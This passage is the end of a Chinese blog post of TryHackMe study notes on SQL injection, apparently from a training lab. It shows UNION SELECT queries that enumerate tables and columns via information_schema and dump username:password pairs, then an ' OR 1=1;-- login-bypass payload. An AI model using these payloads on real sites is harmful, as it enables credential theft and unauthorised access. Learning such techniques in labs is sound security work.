+<p>我们的下一个查询将收集此数据库中的表列表。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema <span class="operator">=</span> <span class="string">&#x27;sqli_one&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这个查询中有一些新的东西需要学习。首先，  group_concat()方法 从多个返回的行中获取指定的列（在我们的例子中为 table_name），并将其放入一个用逗号分隔的字符串中。接下来是 information_schema 数据库；数据库的每个用户都可以访问它，它包含有关用户可以访问的所有数据库和表的信息。在这个特定的查询中，我们有兴趣列出 sqli_one 数据库中的所有表，即 article 和 staff_users。 </p>
+<p>由于第一级旨在发现 Martin 的密码，因此我们感兴趣的是 staff_users 表。我们可以再次利用 information_schema 数据库使用以下查询来查找该表的结构。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;staff_users&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>这类似于前面的 SQL 查询。但是，我们要检索的信息已从 table_name 更改为 column_name，我们在 information_schema 数据库中查询的表已从 tables 更改为 columns，并且我们正在搜索 table_name 列的值为 staff_users的任何行。</p>
+<p>查询结果为 staff_users 表提供了三列：id、密码和用户名。我们可以在下面的查询中使用用户名和密码列来检索用户的信息。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,<span class="string">&#x27;:&#x27;</span>,password SEPARATOR <span class="string">&#x27;&lt;br&gt;&#x27;</span>) <span class="keyword">FROM</span> staff_users</span><br></pre></td></tr></table></figure>
+
+<p>我们再次使用 group_concat 方法将所有行返回到一个字符串中并使其更易于阅读。我们还添加了 ,’:’ 来分隔用户名和密码。我们没有用逗号分隔，而是选择了 HTML  <br> 标记，该标记强制每个结果位于单独的行上，以便于阅读。</p>
+<p>SQL盲注(登录绕过)万能密码登录</p>
+<p>盲 SQLi</p>
+<p>与带内 SQL 注入不同，我们可以直接在屏幕上看到我们的攻击结果，盲 SQLi 是当我们几乎没有反馈来确认我们注入的查询是否，事实上，成功与否，这是因为错误消息已被禁用，但无论如何注入仍然有效。您可能会感到惊讶，我们所需要的只是一点点反馈来成功枚举整个数据库。</p>
+<p>身份验证绕过</p>
+<p>最直接的盲 SQL 注入技术之一是绕过登录表单等身份验证方法。在这种情况下，我们对从数据库中检索数据不感兴趣；我们只想通过登录。 </p>
+<p>连接到用户数据库的登录表单通常以这样一种方式开发，即 Web 应用程序对用户名和密码的内容不感兴趣，而更关心这两者是否在用户表中配对。基本而言，Web 应用程序询问数据库“您有用户名 bob 和密码 bob123的用户吗？”，数据库回答是或否（真&#x2F;假），并根据该答案指示Web 应用程序是否允许您继续。 </p>
+<p>考虑到上述信息，没有必要枚举有效的用户名&#x2F;密码对。我们只需要创建一个回复是&#x2F;真的数据库查询。</p>
+<p>实际的：</p>
+<p>SQL 注入示例的第二级显示了这个确切的示例。我们可以在标有“SQL Query”的框中看到对数据库的查询如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;%username%&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;%password%&#x27;</span> LIMIT <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>注意 %username% 和 %password% 值取自登录表单字段，SQL 查询框中的初始值将是空白的，因为这些字段当前为空。</p>
+<p>要将其变为始终返回 true 的查询，我们可以在密码字段中输入以下内容：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR 1=1;--</span></span><br></pre></td></tr></table></figure>
+
+<p>这会将 SQL 查询变为以下内容：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>因为 1&#x3D;1 是一个 true 语句并且我们使用了 OR 运算符，所以这将始终导致查询返回 true，这满足了 Web 应用程序逻辑，即数据库找到了有效的用户名&#x2F;密码组合并且应该允许访问.</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/%E5%9F%BA%E7%A1%80%E5%90%91/" rel="tag"># 基础向</a>
+              <a href="/tags/Tryhackme/" rel="tag"># Tryhackme</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2022/05/28/Shell/" rel="next" title="Shell">
+      Shell <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.</span> <span class="nav-text">子域名枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#OSINT-SLL-x2F-TLS%E8%AF%81%E4%B9%A6"><span class="nav-number">1.1.</span> <span class="nav-text">OSINT-SLL&#x2F;TLS证书</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OSINT-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="nav-number">1.2.</span> <span class="nav-text">OSINT-搜索引擎</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-number">1.3.</span> <span class="nav-text">DNS暴力破解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OSINT-Sublist3r"><span class="nav-number">1.4.</span> <span class="nav-text">OSINT-Sublist3r</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA"><span class="nav-number">1.5.</span> <span class="nav-text">虚拟主机</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="nav-number">2.</span> <span class="nav-text">身份验证绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7"><span class="nav-number">3.</span> <span class="nav-text">逻辑缺陷</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#cookie%E7%AF%A1%E6%94%B9"><span class="nav-number">3.1.</span> <span class="nav-text">cookie篡改</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IDOR-%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.2.</span> <span class="nav-text">IDOR(越权漏洞)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">4.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86"><span class="nav-number">4.1.</span> <span class="nav-text">目录遍历(路径遍历)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI"><span class="nav-number">4.2.</span> <span class="nav-text">本地文件包含(LFI)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LFI%E7%BB%95%E8%BF%87"><span class="nav-number">4.3.</span> <span class="nav-text">LFI绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-RFI"><span class="nav-number">4.4.</span> <span class="nav-text">远程文件包含(RFI)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab1"><span class="nav-number">4.4.1.</span> <span class="nav-text">Lab1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab2"><span class="nav-number">4.4.2.</span> <span class="nav-text">Lab2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Lab3"><span class="nav-number">4.4.3.</span> <span class="nav-text">Lab3</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF"><span class="nav-number">5.</span> <span class="nav-text">SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84SSRF%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87"><span class="nav-number">5.1.</span> <span class="nav-text">常见的SSRF防御绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">6.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E6%80%A7XSS"><span class="nav-number">6.1.</span> <span class="nav-text">反射性XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="nav-number">6.2.</span> <span class="nav-text">存储型XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DOM%E5%9E%8BXSS"><span class="nav-number">6.3.</span> <span class="nav-text">DOM型XSS</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5RCE"><span class="nav-number">7.</span> <span class="nav-text">命令注入RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">7.0.1.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B"><span class="nav-number">7.1.</span> <span class="nav-text">实例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL-%E6%B3%A8%E5%85%A5"><span class="nav-number">7.2.</span> <span class="nav-text">SQL 注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%A6%E5%86%85%E6%B3%A8%E5%85%A5"><span class="nav-number">7.3.</span> <span class="nav-text">带内注入()</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Lu1i丶"
+      src="/images/1.PNG">
+  <p class="site-author-name" itemprop="name">Lu1i丶</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lu1i丶</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
